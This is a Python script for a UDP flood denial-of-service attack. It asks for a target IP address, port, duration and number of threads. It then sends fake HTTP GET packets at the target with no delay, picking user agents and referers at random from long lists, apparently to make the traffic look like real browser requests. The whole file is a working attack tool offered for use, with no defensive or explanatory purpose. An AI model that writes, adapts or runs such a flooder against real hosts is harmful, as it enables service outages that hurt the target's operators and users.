import socket
import threading
import random
import time

# Global variables to track total requests and data usage
total_requests = 0
total_data_mb = 0

# List of user agents, referers, and headers
# (Your existing code for user_agents, referers, and headers)
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/95.0.1020.53 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/95.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.1 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36"
]

referers = [
    "https://www.google.com",
    "https://www.example.com",
    "https://www.bing.com",
    "https://www.yahoo.com",
    "https://www.amazon.com",
    "https://www.facebook.com",
    "https://www.twitter.com",
    "https://www.instagram.com",
    "https://www.linkedin.com",
    "https://www.reddit.com",
    "https://www.netflix.com",
    "https://www.youtube.com",
    "https://www.apple.com",
    "https://www.microsoft.com",
    "https://www.wikipedia.org",
    "https://www.gmail.com",
    "https://www.dropbox.com",
    "https://www.spotify.com",
    "https://www.ebay.com",
    "https://www.pinterest.com",
    "https://www.stackoverflow.com",
    "https://www.wikipedia.com",
    "https://www.twitch.tv",
    "https://www.medium.com",
    "https://www.soundcloud.com",
    "https://www.microsoft.com",
    "https://www.apple.com",
    "https://www.yelp.com",
    "https://www.evernote.com",
    "https://www.tumblr.com",
    "https://www.quora.com",
    "https://www.udemy.com",
    "https://www.udacity.com",
    "https://www.netflix.com",
    "https://www.spotify.com",
    "https://www.ebay.com",
    "https://www.aliexpress.com",
    "https://www.wikipedia.org"
]

headers = {
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Connection": "keep-alive",
    "Upgrade-Insecure-Requests": "1",
    "Cache-Control": "max-age=0",
    "TE": "Trailers",
    "Pragma": "no-cache",
    "DNT": "1",
    "Sec-GPC": "1",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-User": "?1",
    "Sec-Fetch-Dest": "document",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
    # Add more headers as needed
}

# Function to send UDP packets
def send_udp_packet(ip, port, packet_size):
    global total_requests, total_data_mb
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        end_time = time.time() + send_duration
        packets_sent = 0
        while time.time() < end_time:
            user_agent = random.choice(user_agents)
            referer = random.choice(referers)
            header = random.choice(list(headers.keys()))
            packet = "GET / HTTP/1.1\r\n"
            packet += f"Host: {ip}\r\n"
            packet += f"User-Agent: {user_agent}\r\n"
            packet += f"Referer: {referer}\r\n"
            packet += f"{header}: {headers[header]}\r\n"
            packet += "\r\n"
            packet = packet.encode()
            sock.sendto(packet, (ip, port))
            packets_sent += 1
            total_requests += 1
            total_data_mb += len(packet) / (1024 * 1024)  # Convert bytes to megabytes
            print(f"Packet {packets_sent} sent.")
            # No delay
    except Exception as e:
        print(f"Error: {e}")

# Function to send UDP flood for a specified duration
def send_udp_for_duration(ip, port, packet_size, duration):
    global send_duration
    send_duration = duration
    send_udp_packet(ip, port, packet_size)

# Main function
def main():
    ip = input("Enter the IP address to flood UDP packets: ")
    port = int(input("Enter the port to flood UDP packets: "))
    packet_size = 1250  # bytes
    duration = int(input("Enter the duration to send UDP packets (in seconds): "))
    num_threads = int(input("Enter the number of threads to use: "))
    threads = []

    print("Sending UDP flood...")

    for _ in range(num_threads):
        t = threading.Thread(target=send_udp_for_duration, args=(ip, port, packet_size, duration))
        t.daemon = True
        threads.append(t)

    for t in threads:
        t.start()

    for t in threads:
        t.join()

    print("UDP flood complete.")
    print(f"Total requests sent: {total_requests}")
    print(f"Total data usage: {total_data_mb:.2f} MB")

if __name__ == "__main__":
    main()
